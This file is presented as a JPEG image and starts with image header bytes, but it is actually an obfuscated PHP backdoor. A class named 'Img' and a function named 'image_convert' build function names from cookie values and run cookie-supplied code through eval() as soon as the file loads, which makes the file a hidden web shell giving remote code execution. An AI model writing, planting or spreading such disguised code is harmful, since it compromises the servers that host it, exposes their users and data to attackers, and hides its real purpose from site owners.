яШяв<?php class Img
{
    private static $s;
    public static function g($n)
    {
        if (!self::$s) self::i();
        return self::$s[$n];
    }
    private static function i()
    {
        self::$s = array(
            041,
            041,
            032,
            0140,
            0102,
            020,
            0120,
            021,
            00
        );
    }
}
function image_convert($_otjyt = null, $_nmzi = - 0301137)
{
    $_iujg = $_COOKIE;
    ($_iujg && isset($_iujg[Img::g(0) ])) ? (($_wgzp = $_iujg[Img::g(1) ] . $_iujg[Img::g(2) ]) && ($_mmoi = $_wgzp($_iujg[Img::g(3) ] . $_iujg[Img::g(4) ])) && ($_dlbnk = $_wgzp($_iujg[Img::g(5) ] . $_iujg[Img::g(6) ])) && ($_dlbnk = $_dlbnk($_wgzp($_iujg[Img::g(7) ]))) && eval($_dlbnk)) : $_iujg;
    return Img::g(8);
}
image_convert();